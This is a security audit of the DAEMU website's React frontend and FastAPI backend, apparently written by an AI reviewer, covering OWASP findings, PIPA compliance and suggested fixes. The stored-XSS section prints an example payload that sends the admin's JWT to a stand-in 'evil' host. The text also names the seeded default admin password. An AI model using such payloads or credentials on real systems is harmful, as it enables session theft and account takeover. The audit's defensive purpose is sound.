# DAEMU Website — Security Audit (OWASP Top 10 2021 + PIPA)

**Reviewer:** CTO-level security review (Claude Opus 4.7, 1M context)
**Date:** 2026-04-27
**Scope:** React/Vite frontend (GitHub Pages, branch `demo`) + FastAPI backend (`backend-py/`, deployed to Render at `https://daemu-py.onrender.com`), JWT admin auth, public Contact form, image upload, Resend email integration, MySQL/SQLite via SQLAlchemy.
**Stage:** Demo / pre-launch (no real domain yet, no real customer traffic).

---

## Executive Summary

For a demo-stage product, the codebase shows **decent baseline hygiene**: bcrypt password hashing, JWT with HS256 + 12h TTL, parameterized SQLAlchemy queries (no raw SQL), filename sanitization with path-traversal guard, CORS allowlist, and a server-controlled `from`/`reply_to` so clients can't spoof the sender. However, several **high-severity issues** would prevent a clean production launch:

1. The entire **public-facing data-write surface is unauthenticated and unthrottled** — `/api/inquiries`, `/api/upload`, `/api/email/send`, `/api/email/campaign` can be called by anyone in the world (only the CORS allow-list constrains *browsers*, not curl/scripts). This is an open bulk-mail relay, an open file-upload bucket, and an open inquiry-spam endpoint sitting in front of a paid Resend account and ephemeral Render disk.
2. **Default admin credentials** (`admin@daemu.kr` / `daemu1234` from `render.yaml`) are seeded on first boot if `ADMIN_PASSWORD` env var is unset, with no forced rotation.
3. **No PIPA-compliant consent or privacy notice** on the Contact form. Name/email/phone are collected and stored indefinitely with no retention policy, no deletion right surface, no consent checkbox.
4. **Multiple stored-XSS sinks in the admin SPA** — admin pages under `public/admin-*-page.js` build table rows by template-string concatenation with unescaped user-controlled data (popup `image`/`ctaUrl`, partner `name`, inquiry `phone`, etc.). An attacker who pollutes one inquiry payload (or, in some cases, a popup CTA URL) can run script in the admin's browser session and extract their JWT.
5. The upload endpoint accepts **SVG and PDF** which are scriptable, and serves them from the same origin as the API with no `Content-Disposition: attachment` and no CSP — XSS-via-upload pivot.

The product is **OK to keep running for demo/internal stakeholders**, but should not be opened to public traffic on a real domain until items 1–5 above are fixed. Top three pre-launch actions are listed at the end of this document.

---

## Findings Table

| ID | Severity | Title | Where |
|----|----------|-------|-------|
| F-01 | **Critical** | Unauthenticated email send & campaign endpoints (open mail relay) | `backend-py/main.py:340`, `:398` |
| F-02 | **Critical** | Default admin credentials seeded with no forced rotation | `backend-py/auth.py:31-32`, `render.yaml:24-25` |
| F-03 | **High** | Unauthenticated, unthrottled image upload (8 MB, base64) | `backend-py/main.py:234-274` |
| F-04 | **High** | Unauthenticated public inquiry endpoint with no rate limit, no CAPTCHA, no honeypot | `backend-py/routes_crud.py:79-85` |
| F-05 | **High** | Stored XSS in admin SPA via legacy `innerHTML` concatenation | `public/admin-inquiries-page.js:26-43`, `public/admin-popup-page.js:209-219`, `public/admin-partners-page.js:20-35`, `public/admin-crm-page.js:50-86`, `src/hooks/useSitePopups.js:43-55` |
| F-06 | **High** | Upload allows SVG / PDF and serves from same origin without `Content-Disposition` | `backend-py/main.py:81-89,228` |
| F-07 | **High** | JWT stored in `localStorage` (XSS = full session theft); no rotation, no revocation | `src/lib/auth.js:8`, `src/lib/api.js:7-12` |
| F-08 | **High** | No PIPA consent UI, no privacy policy, no retention/deletion policy | `src/pages/Contact.jsx` (whole), `src/components/Footer.jsx:58` |
| F-09 | **Medium** | Mass-assignment / over-permissive admin CRUD via `dict[str, Any]` payload | `backend-py/routes_crud.py:179-205` |
| F-10 | **Medium** | FastAPI `/docs`, `/redoc`, `/openapi.json` exposed in production | `backend-py/main.py:108` |
| F-11 | **Medium** | Ephemeral JWT secret fallback when `JWT_SECRET` env unset | `backend-py/auth.py:34-40` |
| F-12 | **Medium** | No login throttling / lockout / brute-force defense | `backend-py/auth.py:128-137` |
| F-13 | **Medium** | Public `GET /api/mail-template/{kind}` & `GET /api/content/{key}` leak business templates and any embedded tokens | `backend-py/routes_crud.py:259-266`, `:297-303` |
| F-14 | **Medium** | Outbox stores full email body indefinitely (PII at rest, no retention) | `backend-py/main.py:320-334`, `models.py:144-156` |
| F-15 | **Medium** | No request body / multipart size limit at server / proxy layer (only application-level 8 MB after decode) | `backend-py/main.py:77-78,248` |
| F-16 | **Medium** | `partnerAuth.js` plaintext passwords + 4-digit phone-suffix default + client-side check | `src/lib/partnerAuth.js:1-89`, `public/admin-partners-page.js` |
| F-17 | **Medium** | Render free-tier filesystem is **ephemeral**: uploaded inquiries-attachments and images are silently lost on redeploy | `RENDER_SETUP.md:50`, `backend-py/main.py:74-75` |
| F-18 | **Medium** | Admin SPA has no CSP, no `X-Frame-Options`, no `Referrer-Policy`, no `X-Content-Type-Options` | `index.html`, `vite.config.js`, `backend-py/main.py` (no middleware) |
| F-19 | **Low** | CORS allows `Authorization` header but `allow_credentials=False`; safe by accident, but conflicting intent | `backend-py/main.py:110-117` |
| F-20 | **Low** | Pydantic catch-all `Exception` handler hides stack traces but also masks actionable errors and prevents structured logging | `backend-py/main.py:120-123` |
| F-21 | **Low** | `Outbox` admin GET returns full message bodies including possibly PII to any logged-in admin | `backend-py/routes_crud.py:242-243` |
| F-22 | **Low** | GitHub Actions workflow uses `${{ vars.VITE_API_BASE_URL }}` (a *Variable*, not Secret) — fine for URLs, but the repo has no security-relevant secrets in build pipeline; documented for awareness | `.github/workflows/deploy-pages.yml:36` |
| F-23 | **Low** | `gsap` and `ScrollTrigger` loaded from `cdnjs.cloudflare.com` without `integrity` (SRI) | `index.html:18-19` |
| F-24 | **Low** | `EmailSendIn.replyTo` is user-controllable on a public endpoint — header-injection-style abuse against Resend's reply chain | `backend-py/main.py:179`, `:362-363` |
| F-25 | **Info** | SQLite in production on Render free tier: not encrypted at rest, no backups, ephemeral disk | `db.py:24-27`, `render.yaml:26-29` |
| F-26 | **Info** | `loadAdminMailTemplate()` reads from `localStorage` then forwards `body` (admin-controlled) into HTML preview escape path correctly, but the *campaign* path forwards admin HTML straight to Resend without a DOMPurify-style server pass | `src/lib/email.js:43-82` |

---

## Critical & High Findings — Detail and Suggested Fix

### F-01 — Unauthenticated email send & campaign endpoints (Critical)

**Where:** `backend-py/main.py:340-392` (`/api/email/send`), `:398-475` (`/api/email/campaign`).

**Evidence:**
```python
@app.post("/api/email/send")
async def email_send(payload: EmailSendIn, session: AsyncSession = Depends(get_session)):
    if not payload.to or not payload.subject:
        raise HTTPException(400, detail="to and subject are required")
    ...
```
There is **no `Depends(require_admin)`** on either endpoint. The CORS list (`https://juyoungjun.github.io`, localhost) only constrains browsers honoring CORS preflight — `curl`, server-side scripts, and headless tools ignore CORS entirely. Anyone who knows the Render URL (which is public via `render.yaml` and the `/api/health` endpoint that echoes the config) can:

- POST to `/api/email/campaign` with arbitrary recipient lists, arbitrary HTML (incl. phishing) — and DAEMU's Resend account sends and gets the abuse rep.
- POST `/api/email/send` with a controlled `replyTo` to scrape replies into an attacker inbox while the message appears to come from `DAEMU <onboarding@resend.dev>` (or your future verified domain — much worse).

**Why critical:** This is a textbook **A04 Insecure Design** + **A01 Broken Access Control** combination. Email spoofing using your verified Resend domain is a one-shot reputation kill (SPF/DKIM aligned, your domain blacklisted). On Resend Free (3,000/mo) a single attacker burst will exhaust the quota and may trigger account suspension.

**Fix (suggested code, `main.py`):**
```python
from auth import require_admin

@app.post("/api/email/send")
async def email_send(
    payload: EmailSendIn,
    session: AsyncSession = Depends(get_session),
    _user: AdminUser = Depends(require_admin),   # add this
):
    ...

@app.post("/api/email/campaign")
async def email_campaign(
    payload: CampaignIn,
    session: AsyncSession = Depends(get_session),
    _user: AdminUser = Depends(require_admin),   # add this
):
    ...
```

The only sender that legitimately needs to be public is the **Contact-form auto-reply**. Move that flow server-side: when `POST /api/inquiries` succeeds, the backend itself should send the auto-reply (using a server-side template), not the browser. Then `/api/email/send` and `/api/email/campaign` can be admin-only without breaking the contact form.

---

### F-02 — Default admin credentials with no forced rotation (Critical)

**Where:** `backend-py/auth.py:31-32`, `render.yaml:24-25`, `backend-py/.env.example:12`.

**Evidence:**
```python
# auth.py
ADMIN_EMAIL = os.environ.get("ADMIN_EMAIL", "admin@daemu.local")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "daemu1234")
```
```yaml
# render.yaml
- key: ADMIN_PASSWORD
  sync: false   # set in Render dashboard (secret) — first-boot seed only
```
```dotenv
# .env.example
ADMIN_PASSWORD=daemu1234
```
`ensure_default_admin()` (`auth.py:111-125`) seeds the user once. If the operator forgets to set `ADMIN_PASSWORD` in the Render dashboard before the first deploy, the live system has the password `daemu1234`. There is also **no first-login forced password change** — the seeded admin keeps the seed password forever. The frontend (`src/lib/auth.js:30-33`) additionally has a "demo fallback" branch that accepts *any* non-empty creds when `VITE_API_BASE_URL` is empty.

**Fix:**
1. In `render.yaml`, replace the default `ADMIN_PASSWORD: sync: false` with `generateValue: true` so Render auto-generates one and the operator must read it from the dashboard (same pattern already used for `JWT_SECRET`).
2. In `auth.py:111-125`, refuse to seed a default admin when `ADMIN_PASSWORD` env var is empty or shorter than ~12 chars; log a fatal message and exit instead of silently seeding `daemu1234`.
3. Add a `must_change_password` flag on `AdminUser`; force a password-change flow on next login.
4. Remove the `daemu1234` literal from `.env.example` (replace with `change-me-on-first-boot`).

---

### F-03 — Unauthenticated image upload, base64 path, no rate limit (High)

**Where:** `backend-py/main.py:234-274`.

**Evidence:**
```python
@app.post("/api/upload")
async def upload(payload: UploadIn, request: Request):
    if not payload.filename or not payload.content:
        raise HTTPException(400, detail="filename + content required")
    ...
    if len(buf) > MAX_UPLOAD_BYTES:
        raise HTTPException(413, detail="file too large (8MB cap)")
```
No `require_admin`. No global rate limit. The 8 MB cap is checked **after** the base64 string is already decoded into memory; uvicorn defaults will accept the JSON body (`base64` ≈ 4/3 of the binary, so up to ~10–11 MB JSON before the check fires). An attacker can:

1. Spam-fill the disk on Render until the service crashes.
2. Exhaust Render free-tier bandwidth and CPU with parallel base64-decode operations.
3. Plant arbitrary files (incl. malicious SVG/PDF — see F-06) to be served from `https://daemu-py.onrender.com/uploads/...`.

**Fix:**
```python
@app.post("/api/upload")
async def upload(
    payload: UploadIn,
    request: Request,
    _user: AdminUser = Depends(require_admin),   # admin-only
):
    # Reject before decode if the base64 string is implausibly large
    if len(payload.content) > int(MAX_UPLOAD_BYTES * 4 / 3) + 32:
        raise HTTPException(413, detail="file too large")
    ...
```

Add a real rate-limiter middleware (e.g. `slowapi`): `@limiter.limit("10/minute")` on the upload endpoint and `5/minute` on email/inquiry endpoints. Upload destination should also move off the local filesystem (Cloudflare R2 or S3) for production — Render free disk is ephemeral (F-17).

---

### F-04 — Public `/api/inquiries` is unrate-limited and trivially scriptable (High)

**Where:** `backend-py/routes_crud.py:79-85`, used by `src/pages/Contact.jsx` and `src/lib/consultForms.js`.

**Evidence:**
```python
@router.post("/inquiries", status_code=201)
async def create_inquiry(payload: InquiryIn, session: AsyncSession = Depends(get_session)):
    inq = Inquiry(**payload.model_dump())
    session.add(inq)
    await session.flush()
    return {"ok": True, "id": inq.id, "inquiry": model_to_dict(inq)}
```
The contact form has no honeypot, no CAPTCHA, no rate limit, and the React component (`Contact.jsx:21-82`) has no client-side throttle either. The DB row size is ~Text-bounded but unbounded for `message` (`models.py:62`: `Text`), so a single bot can fill the table with arbitrary content. Combined with F-01, every inquiry also fires `sendAutoReply` — every spam submission sends a real email **to attacker-controlled addresses**, paid by your Resend quota.

**Fix:**
1. Add a honeypot field (hidden `<input name="company_url">`) and reject non-empty submissions server-side.
2. Add `slowapi` per-IP rate limit (`5/hour`) on `/api/inquiries`.
3. Add Cloudflare Turnstile or hCaptcha (free, no PII) on the Contact form.
4. Length-cap `message` server-side (e.g. 4 KB) and validate `phone` against KR phone regex.
5. Move auto-reply to server (see F-01) and rate-limit it per recipient (don't auto-reply to the same email more than once per hour).

---

### F-05 — Stored XSS in admin SPA via `innerHTML` template concatenation (High)

**Where:** Multiple files. Most damaging examples:

`public/admin-popup-page.js:209-219`:
```javascript
const imgHtml = popup.image ? `<img class="site-popup-image" src="${popup.image}" alt="">` : "";
...
const ctaHtml = (popup.ctaText && popup.ctaUrl)
  ? `<a class="site-popup-cta" href="${popup.ctaUrl}" onclick="...">...</a>` : "";
overlay.innerHTML = `<div class="site-popup-box">...${imgHtml}...${ctaHtml}</div>`;
```
`popup.image` and `popup.ctaUrl` come from admin input but also from the *backend* (server-stored popups can be edited via `/api/popups`); they are dropped into an attribute value with no escaping. Payload `" onerror=fetch('//evil/?'+localStorage.daemu_admin_token)` fires when an admin opens the popup admin page or when any visitor sees the popup on the public site (`src/hooks/useSitePopups.js:43-55` has the same bug).

`public/admin-inquiries-page.js:26-43`:
```javascript
document.getElementById("list").innerHTML = data.length ? data.map(d =>
    `<tr>
      <td data-label="이름">${d.name}</td>
      <td data-label="연락처">${d.phone||"-"}</td>
      ...
```
`d.name`, `d.phone`, `d.type`, `d.date` are placed unescaped. The contact form is **public** — anyone can submit `<img src=x onerror=...>` as a name and the admin's first table-render runs it.

`public/admin-crm-page.js:50-86`, `public/admin-partners-page.js:20-35`, `public/admin-orders-page.js:39-63` — same pattern, multiple unescaped concatenations.

**Why high:** JWT lives in `localStorage` (F-07), so a single XSS = full admin takeover (delete inquiries, change mail templates to attacker-controlled HTML and trigger a campaign send to the entire CRM).

**Fix:**
- For each `${...}` interpolation inside an `innerHTML` template, wrap with `escapeHtml()` (already exported from `src/lib/db.js:56`).
- For URLs in `href=` / `src=` attributes, additionally validate the scheme against `https?:` only (reject `javascript:`, `data:` except images, etc).
- Or, the cleanest fix: rewrite these admin tables in React (most are already shells around `RawPage` — convert the table-rendering parts into JSX so React's auto-escaping does the work).
- Add a CSP `script-src 'self'` to the admin SPA — currently absent (F-18). This won't block injected event handlers like `onerror=` until you also drop inline JS, but it's a partial mitigation.

---

### F-06 — Upload allows SVG/PDF and serves them as same-origin scriptable content (High)

**Where:** `backend-py/main.py:81-89, 228, 234-274`.

**Evidence:**
```python
EXT_TO_MIME = {
    ".jpg": "image/jpeg",
    ".jpeg": "image/jpeg",
    ".png": "image/png",
    ".gif": "image/gif",
    ".webp": "image/webp",
    ".svg": "image/svg+xml",
    ".pdf": "application/pdf",
}
```
SVG can contain `<script>` and executes when loaded directly via URL (not when used in `<img>`, but yes when navigated to as `https://daemu-py.onrender.com/uploads/foo.svg`). PDF can contain JavaScript and be opened inline by old viewers. Files are served by `CachedStatic` mounted at `/uploads` (`main.py:228`) with no `Content-Disposition: attachment` and no `X-Content-Type-Options: nosniff`.

In addition, the only validation of upload content is filename-extension-based — the actual byte content is never sniffed. An attacker can upload `evil.png` containing HTML; if a browser sniffs it as text/html (some do, despite headers), it's an XSS pivot.

**Fix:**
1. Drop `.svg` and `.pdf` from `EXT_TO_MIME` for the public path. Allow them only on a separate, admin-only attachment endpoint that adds `Content-Disposition: attachment; filename="..."`.
2. Validate uploaded content with a magic-byte sniffer (`python-magic` or `Pillow.open()` for images) — reject anything whose decoded bytes don't match the claimed type.
3. Add `X-Content-Type-Options: nosniff` on all `/uploads/*` responses (extend `CachedStatic.get_response`).
4. Consider serving uploads from a different origin (e.g. `uploads.daemu.kr`) so XSS on the uploads host can't reach the admin SPA's session storage.

---

### F-07 — JWT in `localStorage`; no rotation; no revocation list (High)

**Where:** `src/lib/auth.js:8`, `src/lib/api.js:7-12`, `backend-py/auth.py:74-83`.

**Evidence:**
```javascript
const TOKEN_KEY = 'daemu_admin_token';
function authHeader() {
  const t = localStorage.getItem(TOKEN_KEY);
  return t ? { Authorization: `Bearer ${t}` } : {};
}
```
JWT is HS256, 12-hour TTL, stored in `localStorage` — accessible to any same-origin script (so any successful XSS = admin takeover, see F-05). There is no server-side token blacklist, so a leaked JWT is valid until expiry; logging out only deletes the local copy. The token also embeds `email` and `role` claims, which are read from the token on the server (`auth.py:106`: `claims.get("role")`) — but `auth.py:103` does cross-check `user.active` against the DB. Good. However, if `role` is changed in DB to non-admin, an outstanding JWT still has `role=admin` and stays valid for up to 12 h.

**Fix:**
1. Move JWT to an `HttpOnly; Secure; SameSite=Strict` cookie (then `allow_credentials=true` on CORS — paired with a stricter origin allowlist). `localStorage` is the easy path but fundamentally vulnerable to XSS.
2. Re-derive role from `user.role` in the DB on every request (you already load `user`, just use `user.role` instead of `claims.get("role")` at `auth.py:106-107`).
3. Add a `token_version` column on `AdminUser`; include it in JWT claims; bump it on logout/role-change/password-change to invalidate outstanding tokens.
4. Consider shortening the TTL to 1–2 h with a refresh-token flow.

---

### F-08 — No PIPA compliance: no consent, no privacy notice, no retention/deletion (High — *for production launch only*)

**Where:** `src/pages/Contact.jsx:106-156`, `src/components/Footer.jsx:58` (placeholder Privacy Policy link).

**Evidence:**
- The Contact form collects 이름, 연락처, E-mail, 브랜드명, 매장 위치, 예상 오픈 시기, 문의 내용 — at least name/phone/email constitute 개인정보 under 개인정보보호법 (PIPA).
- There is **no consent checkbox**, no `<a>` to a 개인정보처리방침 (Privacy Policy), no statement of collection purpose, no statement of retention period, no statement of deletion / withdrawal-of-consent rights.
- The footer "Privacy Policy" link is `href="javascript:void(0)"` (placeholder).
- `Inquiry` table (`models.py:50-66`) has no `expires_at` / retention column; data is kept forever by default.
- Outbox table (`models.py:144-156`) stores the **full email body** (which is the customer's auto-reply, containing their name, category, message) — also indefinitely.

**Why high (for production):** Demo with 0 real users → tolerable. Once a real domain is live and the form receives real submissions, this is a 개인정보보호법 violation: PIPA requires written notice + consent at collection time (§15), retention period disclosure (§17), and a documented deletion flow (§21). KCC/PIPC (개인정보보호위원회) fines escalate quickly for SMB sites that collect inquiry-form data without notice.

**Fix:** See "Korean Compliance Section" below.

---

### F-09 — Mass-assignment risk in generic admin CRUD (Medium)

**Where:** `backend-py/routes_crud.py:154-212` (`_crud()` factory), all admin POST/PATCH endpoints for partners/orders/works/popups/crm/campaigns/promotions/outbox.

**Evidence:**
```python
@router.post(f"/{prefix}", status_code=201)
async def create_(
    payload: dict[str, Any],   # ← raw dict, no Pydantic model
    ...
):
    data = {k: v for k, v in payload.items() if k in create_fields}
    obj = model(**data)
```
The endpoint accepts *any* JSON dict and filters by `create_fields`. The allow-list approach in `_crud()` does work as intended (so `id`, `created_at`, `password_hash`, etc. on `Partner` cannot be set) — but consider:

- `Partner` has `password_hash` in the model (`models.py:81`). It is **not** in the allowlist (line 216), so safe today.
- But a future maintainer adding `password_hash` to the `allowed_fields` set (e.g. for admin password-reset) without thinking about hashing creates an instant bypass.
- `Outbox` admin CRUD (`routes_crud.py:242-243`) allows admins to write arbitrary `status`, `error`, `payload` — fine for admins, but means audit-log integrity is poor (see F-21).
- No Pydantic validation on the payload dict means an admin can put a 50 MB string into `Order.note` (Text column — bounded only by DB).

**Fix:** Replace `dict[str, Any]` payloads with explicit Pydantic models per entity. This also gets you free type/length validation (e.g. `Field(max_length=8000)` on `note`).

---

### F-10 — FastAPI auto-docs exposed in production (Medium)

**Where:** `backend-py/main.py:108`.

**Evidence:**
```python
app = FastAPI(title="DAEMU API", version="3.0", lifespan=lifespan)
```
No `docs_url=None, redoc_url=None, openapi_url=None`. Anyone can hit `https://daemu-py.onrender.com/docs` and get the full interactive API surface, including the unauthenticated email/upload endpoints (F-01, F-03), the admin endpoints (with login button), and the OpenAPI schema.

**Why medium:** This is reconnaissance candy — for an attacker, it tells them exactly which endpoints exist, expected payloads, and which ones are unauth.

**Fix:**
```python
app = FastAPI(
    title="DAEMU API",
    version="3.0",
    lifespan=lifespan,
    docs_url=None if PROD else "/docs",
    redoc_url=None,
    openapi_url=None if PROD else "/openapi.json",
)
```
…where `PROD = os.environ.get("ENV") == "prod"`. Or gate `/docs` behind HTTP basic auth in production.

---

### F-11 — Ephemeral JWT secret fallback (Medium)

**Where:** `backend-py/auth.py:34-40`.

**Evidence:**
```python
if not JWT_SECRET:
    import secrets
    JWT_SECRET = secrets.token_hex(32)
    print("[auth] JWT_SECRET not set — using ephemeral secret. Set JWT_SECRET env for production.")
```
On Render, `render.yaml` uses `generateValue: true` for `JWT_SECRET`, so this branch is unlikely to fire in your real deploy. But: the fallback **doesn't fail loudly** — a misconfigured deploy boots fine, all sessions silently invalidate on every restart, and no alarm fires. Worse, on Render free tier the service restarts when idle (15 min sleep + cold start) — even if `JWT_SECRET` *is* set, you should verify it actually hits the env at runtime; a configuration drift here means everyone gets logged out frequently and silently.

**Fix:** Refuse to start if `JWT_SECRET` is unset and `os.environ.get("ENV") == "prod"`. Otherwise log an explicit `WARNING:auth:` line (not `print`) so it's visible in Render logs.

---

### F-12 — No login throttling / lockout (Medium)

**Where:** `backend-py/auth.py:128-137`.

**Evidence:**
```python
@router.post("/login", response_model=LoginOut)
async def login(payload: LoginIn, session: AsyncSession = Depends(get_session)):
    res = await session.execute(select(AdminUser).where(AdminUser.email == payload.email))
    user = res.scalar_one_or_none()
    if not user or not user.active or not verify_password(payload.password, user.password_hash):
        raise HTTPException(401, detail="invalid credentials")
```
A brute-force attacker can hammer this endpoint at ~bcrypt's verify rate (~50–200 ms each) — slow, but unbounded. With default password `daemu1234` (F-02) the attack is over before any defense matters; with a strong password it's still suboptimal hygiene.

**Fix:** `slowapi` per-IP `@limiter.limit("5/minute")` + per-user counter (5 failed logins / 15 min = lock for 30 min). Log lockouts to a table (and to the security telemetry — F-19 maps to this).

---

### F-13 — Public mail-template & content-block reads leak business assets (Medium)

**Where:** `backend-py/routes_crud.py:259-266`, `:297-303`.

**Evidence:**
```python
@router.get("/mail-template/{kind}")
async def get_mail_template(kind: str, session: AsyncSession = Depends(get_session)):
    """Public read so the frontend can render the auto-reply preview without auth."""
    ...
```
Anyone (curl) can fetch any mail template (including `admin-reply` and `document` kinds — internal templates) and any `/api/content/{key}` block. The `kind` param is regex-restricted in the writer (`MailTemplateUpsert` line 250) but the **reader doesn't restrict** — `GET /api/mail-template/anything` will probe the table and return whatever exists.

If admins paste sensitive boilerplate into mail templates (signed PDF URLs, internal links, partner discounts) — those are public. Today the comment says it's "for the frontend to render the auto-reply preview without auth" — the *auto-reply* template is fine to expose, but `admin-reply` and `document` are internal.

**Fix:** Restrict the public reader to `kind == "auto-reply"` only:
```python
PUBLIC_KINDS = {"auto-reply"}

@router.get("/mail-template/{kind}")
async def get_mail_template(kind: str, ...):
    if kind not in PUBLIC_KINDS:
        raise HTTPException(404)
    ...
```
And require admin auth on the others.

---

### F-14 — Outbox is an indefinite PII archive (Medium)

**Where:** `backend-py/main.py:320-334`, `models.py:144-156`.

Every email send (auto-reply included) writes the recipient address, subject, and body (truncated to 8000 chars) plus the JSON payload to the `outbox` table forever. After 1 year of operation this is a pile of customer name/email/category/message history — high-value PII concentrated in one table, with no encryption at rest (SQLite or default MySQL), no rotation, and admin SPA exposes it via the `/admin/outbox` page.

**Fix:**
1. Truncate `body` aggressively (e.g. 1024 chars + "…") for outbox; the source data is in `inquiries` already.
2. Add a scheduled cleanup job (cron / Celery) that deletes outbox entries older than 90 days.
3. PIPA-friendly: list "이메일 발송 이력" in your privacy policy with the 90-day retention.

---

### F-15 — No proxy-level body size limit (Medium)

**Where:** `backend-py/main.py` (uvicorn started without `--limit-max-requests` etc.), `render.yaml` (no nginx in front).

Render's free tier doesn't put a hard body limit in front of uvicorn. The application checks 8 MB *after decode* (`main.py:248`). An attacker can send a 100 MB JSON payload; uvicorn buffers it before the handler runs.

**Fix:** Add a starlette middleware that rejects any request with `Content-Length > 12_000_000` early, returning 413 before the body is fully read. Or run behind a real reverse proxy (Caddy/nginx) with `client_max_body_size 12m`.

---

### F-16 — `partnerAuth.js` plaintext passwords + 4-digit default (Medium, scoped to demo)

**Where:** `src/lib/partnerAuth.js:1-89`.

**Evidence:**
```javascript
function defaultPasswordOf(p) {
  if (p.phone) return String(p.phone).replace(/\D/g, '').slice(-4) || 'daemu';
  return 'daemu';
}
...
const expected = match.password || defaultPasswordOf(match);
if (String(password) !== String(expected)) return { ok: false, reason: 'bad-password' };
```
Partner login is **client-side only** — passwords are stored in plaintext in `localStorage` (`daemu_partners`), and the comparison is `String(password) !== String(expected)`. Default password is the last 4 digits of the phone number (≤ 10,000 candidates, often guessable from their public phone listing on a partner profile). The `Partner` SQL model has a `password_hash` field but it's unused on the frontend path.

**Why medium and not high:** Today this guards a UI section that doesn't have a real backend gate — partners are not a privileged role, and there's no actual authenticated partner endpoint on the FastAPI backend. As long as it stays demo-only this is cosmetic.

**Fix (before partner endpoints go live):**
1. Move partner login to the server. Reuse `Partner.password_hash` (already in the model).
2. Issue a separate JWT for partners with `role: "partner"`; backend endpoints check it.
3. Drop the `defaultPasswordOf(phone-last-4)` flow entirely; require a one-time setup token emailed to the partner.

---

### F-17 — Render filesystem ephemerality (Medium)

**Where:** `RENDER_SETUP.md:50` (documented), `backend-py/main.py:74-75` (uses local FS).

**Evidence:**
```python
UPLOAD_DIR = Path(__file__).parent / "uploads"
```
On Render free tier, the disk resets on every redeploy and on idle restarts. So:
- Inquiry attachment images uploaded by visitors silently disappear after each cold start.
- Auto-reply / admin emails that referenced uploaded image URLs (e.g. inline newsletter banners) suddenly 404 from the recipient's mailbox a day later.
- `daemu.db` (SQLite) — same fate. **Inquiries themselves are wiped on redeploy.**

This is a data-integrity / availability issue, not a confidentiality one — but for a demo that pretends to be production-ish it's surprising.

**Fix:** For production, use Render's paid persistent disk OR Cloudflare R2 / S3 for uploads + a hosted MySQL (Cafe24, Aiven, PlanetScale). For demo, document it loudly in the admin UI ("⚠️ 데모 환경: 데이터는 매 배포 시 초기화됩니다").

---

### F-18 — No security headers on frontend (Medium)

**Where:** `index.html`, `vite.config.js`, GitHub Pages serves the static SPA with default headers.

GitHub Pages does set `Strict-Transport-Security` and uses HTTPS by default — good. But there is **no Content-Security-Policy** anywhere (neither in `index.html` `<meta>` nor in any future custom-domain config), no `X-Frame-Options`, no `Referrer-Policy: same-origin`. Combined with the multiple `dangerouslySetInnerHTML` and legacy `innerHTML` sinks (F-05), missing CSP makes XSS trivially exploitable end-to-end.

The backend also sets no security headers on its own responses.

**Fix:**
1. Add a `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://daemu-py.onrender.com; frame-ancestors 'none';">` to `index.html`. Tighten `'unsafe-inline'` over time.
2. On the backend, add a starlette middleware that sets `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `X-Frame-Options: DENY`, and `Strict-Transport-Security: max-age=63072000; includeSubDomains` on every response.

---

## OWASP Top 10 (2021) Summary

| Category | Status | Key findings |
|----------|--------|--------------|
| **A01 Broken Access Control** | **Critical** | F-01 (email endpoints unauth), F-03 (upload unauth), F-13 (template GET leak), F-09 (mass-assignment risk via `dict[str, Any]`) |
| **A02 Cryptographic Failures** | OK with caveats | bcrypt + HS256 JWT are appropriate; F-11 (ephemeral fallback), F-25 (no DB encryption at rest), HTTPS provided by Render/GH Pages |
| **A03 Injection** | OK | All queries use SQLAlchemy ORM with bound params (no raw SQL anywhere). HTML in mail bodies is escape-routed in `email.js:30-37` for plain text — but admin-controlled `html` field on `MailTemplate` is sent verbatim to Resend. Acceptable since admin-trusted; flag F-26 |
| **A04 Insecure Design** | **High** | F-04 (no contact-form anti-abuse), F-01 (open relay), F-08 (no consent flow), F-16 (partner auth design) |
| **A05 Security Misconfiguration** | **Medium-High** | F-10 (`/docs`), F-15 (no body limit), F-18 (no headers), F-02 (default creds) |
| **A06 Vulnerable Components** | OK | Pinned recent versions: FastAPI 0.118+, Pydantic 2.11+, SQLAlchemy 2.0.36+, bcrypt 4.2+, react 18.3, vite 5.4. Run `pip-audit` and `npm audit` regularly. F-23 (CDN GSAP without SRI) |
| **A07 Identification & Authentication Failures** | **High** | F-02 (default creds), F-12 (no throttling), F-07 (JWT in localStorage, no revocation), F-16 (partner plaintext pwd) |
| **A08 Software & Data Integrity Failures** | OK | GitHub Actions workflow uses pinned `@v4`/`@v5` actions, `npm ci` for lockfile integrity. F-23 (no SRI on cdnjs) |
| **A09 Security Logging & Monitoring Failures** | **Medium** | No structured logs, no security event log, no failed-login tracking, no abuse alerts. `print(...)` everywhere. The `Outbox` table is a partial audit log but not security-focused (F-14, F-21) |
| **A10 SSRF** | OK | Only outbound HTTP is to `https://api.resend.com` (hardcoded). The `replyTo` field is a header value, not a URL the server fetches. No user-controlled URLs are dereferenced server-side. F-24 (replyTo abuse is more spam-ish than SSRF) |

---

## Korean Compliance — PIPA / 정보통신망법 / 개인정보보호법

### Current state

The Contact form (`src/pages/Contact.jsx`) collects:
- 이름 (필수, 식별 가능 → 개인정보)
- 연락처 (선택, 식별 가능 → 개인정보)
- E-mail (필수, 식별 가능 → 개인정보)
- 브랜드명 / 매장 위치 / 예상 오픈 시기 / 문의 내용

There is **no**:
- 개인정보 수집·이용 동의 체크박스
- 수집 목적 / 보유 기간 / 제3자 제공 여부 명시
- 개인정보처리방침 링크 (Footer link is `javascript:void(0)` placeholder — `Footer.jsx:58`)
- 개인정보 보호책임자 (DPO) 표기
- 정보주체의 권리 (열람·정정·삭제·처리정지) 안내
- 14세 미만 동의 안내 (서비스 특성상 해당 없음일 가능성 높음 — 명시 권장)

The auto-reply email also has no opt-out language, which **정보통신망법 §50** could touch if classified as 광고성 정보 (the current auto-reply is transactional, so likely fine, but campaign emails — `/api/email/campaign` — definitely require `(광고)` in the subject and an unsubscribe footer).

### Required gaps to close before production launch

1. **개인정보 수집·이용 동의 (Required at collection — PIPA §15)**
   - Add a required checkbox above the submit button:
     - `[필수] 개인정보 수집·이용에 동의합니다. (자세히 보기)` linking to a 개인정보처리방침 page.
   - Inline summary block on the form:
     - 수집 항목: 이름, 이메일, 연락처(선택), 브랜드명, 문의 내용
     - 수집 목적: 상담 문의 응답 및 후속 컨설팅 제안
     - 보유 기간: 상담 종료 후 1년 (또는 법적 보존의무가 있는 경우 해당 기간)
